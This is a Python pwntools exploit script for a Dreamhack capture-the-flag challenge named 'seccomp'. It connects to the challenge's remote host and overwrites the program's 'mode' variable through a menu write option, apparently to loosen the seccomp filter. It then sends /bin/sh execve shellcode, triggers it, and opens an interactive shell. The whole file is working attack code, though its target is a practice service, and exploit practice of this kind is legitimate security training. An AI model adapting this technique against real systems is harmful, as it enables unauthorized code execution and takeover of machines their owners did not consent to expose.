#!/usr/bin/env python3
from pwn import *

e = ELF('./seccomp')
context.arch = 'amd64'
context.log_level = 'debug'

# p = process('./seccomp')
p = remote("host3.dreamhack.games", 18233)

sc = asm(shellcraft.sh())           # /bin/sh execve shellcode (23B)

p.recvuntil(b'> ')
p.sendline(b'3')
p.sendlineafter('addr: ', str(e.sym['mode']))
p.sendlineafter('value: ', str(2))

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'shellcode: ')
# payload = sc.ljust(1024, b'\x90')  # NOP padding
payload = sc
p.send(payload)

p.recvuntil(b'> ')
p.sendline(b'2')

p.interactive()
